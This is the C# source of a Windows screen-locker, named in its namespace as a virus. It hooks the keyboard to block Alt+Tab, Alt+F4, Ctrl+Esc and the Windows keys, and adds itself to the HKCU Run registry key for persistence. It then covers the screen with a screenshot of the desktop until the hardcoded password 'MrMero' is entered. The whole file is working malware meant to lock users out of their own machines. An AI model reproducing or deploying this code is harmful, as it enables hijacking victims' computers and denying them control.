using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace VirusLockingScreenShowingText
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    /// 
    public partial class MainWindow : Window
    {
        public BitmapImage BitmapToImageSource(Bitmap bitmap)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                bitmap.Save(memory, System.Drawing.Imaging.ImageFormat.Bmp);
                memory.Position = 0;
                BitmapImage bitmapimage = new BitmapImage();
                bitmapimage.BeginInit();
                bitmapimage.StreamSource = memory;
                bitmapimage.CacheOption = BitmapCacheOption.OnLoad;
                bitmapimage.EndInit();

                return bitmapimage;
            }
        }
        public static void AddApplicationToStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("BetterDeleteThisByMero", "\"" + System.IO.Path.ChangeExtension(System.Reflection.Assembly.GetExecutingAssembly().Location, ".exe") + "\"");
            }
        }

        public static void DeleteApplicationFromStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("BetterDeleteThisByMero", false);
            }
        }

        public MainWindow()
        {
            InitializeComponent();

            // hook keyboard
            IntPtr hModule = GetModuleHandle(IntPtr.Zero);
            hookProc = new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc);
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hModule, 0);

            this.WindowState = WindowState.Minimized;

            AddApplicationToStartup();

            double screenLeft = 0;
            double screenTop = 0;
            double screenWidth = SystemParameters.PrimaryScreenWidth;
            double screenHeight = SystemParameters.PrimaryScreenHeight;

            Bitmap bmp = new Bitmap((int)screenWidth, (int)screenHeight);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen((int)screenLeft, (int)screenTop, 0, 0, bmp.Size);

            image.Source = BitmapToImageSource((Bitmap)bmp);

            this.WindowState = WindowState.Maximized;
            
        }

        private void passwd_KeyDown(object sender, KeyEventArgs e)
        {
            if (passwd.Text == "MrMero")
            {
                DeleteApplicationFromStartup();
                Application.Current.Shutdown();
            }
        }

        /// Magic here
        private struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
        int scanCode;
        public int flags;
        int time;
        int dwExtraInfo;
        }

        private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hHook);

        [DllImport("user32.dll")]
        private static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(IntPtr path);

        private IntPtr hHook;
        LowLevelKeyboardProcDelegate hookProc; // prevent gc
        const int WH_KEYBOARD_LL = 13;


        private static int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            if (nCode >= 0)
                switch (wParam)
                {
                    case 256: // WM_KEYDOWN
                    case 257: // WM_KEYUP
                    case 260: // WM_SYSKEYDOWN
                    case 261: // M_SYSKEYUP
                        if (
                            (lParam.vkCode == 0x09 && lParam.flags == 32) || // Alt+Tab
                            (lParam.vkCode == 0x1b && lParam.flags == 32) || // Alt+Esc
                            (lParam.vkCode == 0x73 && lParam.flags == 32) || // Alt+F4
                            (lParam.vkCode == 0x1b && lParam.flags == 0) || // Ctrl+Esc
                            (lParam.vkCode == 0x5b && lParam.flags == 1) || // Left Windows Key 
                            (lParam.vkCode == 0x5c && lParam.flags == 1))    // Right Windows Key 
                        {
                            return 1; //Do not handle key events
                        }
                        break;
                }
            return CallNextHookEx(0, nCode, wParam, ref lParam);
        }


        private void Window_Closed(object sender, EventArgs e)
        {
            UnhookWindowsHookEx(hHook); // release keyboard hook
        }
    }
}
